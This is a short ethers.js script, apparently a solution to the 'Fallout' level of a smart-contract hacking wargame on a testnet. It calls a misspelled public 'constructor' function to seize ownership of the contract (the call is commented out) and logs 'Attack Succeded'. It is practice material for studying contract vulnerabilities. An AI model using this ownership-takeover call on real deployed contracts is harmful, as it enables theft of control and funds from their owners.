const { ethers } = require('ethers')
const ABI = require('../abi/2_fallout.json')
require("dotenv").config()

const provider = new ethers.providers.InfuraProvider("rinkeby")
const Wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider)

// replace it with your contract address
const ContractAddress = "0x-----------"
const fallout = new ethers.Contract(ContractAddress,ABI,Wallet)

const startHack = async() => {
    try{
        // await fallout.Fal1out()
        const newOwner = await fallout.owner()
        console.log("Attack Succeded: ", newOwner)
    }catch(e){
        console.log(e)
    }
}

startHack()